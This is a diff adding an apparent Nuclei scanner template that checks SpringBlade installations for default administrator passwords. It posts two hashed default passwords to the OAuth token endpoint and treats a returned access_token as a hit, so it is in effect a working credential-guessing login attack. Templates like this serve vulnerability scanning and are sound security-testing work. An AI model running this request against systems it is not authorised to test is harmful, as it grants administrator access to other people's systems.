@@ -1,0 +1,33 @@
+id: SpringBlade-weak-pwd
+
+info:
+  name: SpringBlade 默认密码
+  author: sec
+  severity: high
+  description: https://forum.butian.net/share/973
+  tags: jwt
+
+http:
+  - raw:   
+      - |
+        POST /api/blade-auth/oauth/token?tenantId=000000&username=admin&password={{pwd}}&grant_type=password&scope=all&type=account HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+        Connection: close
+
+    payloads:
+      pwd:
+        - "e10adc3949ba59abbe56e057f20f883e"
+        - "900d08535e993135719ace2689a009a8"
+
+    attack: batteringram
+    threads: 5
+    stop-at-first-match: true
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'contains(body, "\"access_token\":\"")'
+          - 'status_code == 200'
+          - 'contains(header, "application/json")'
+        condition: and
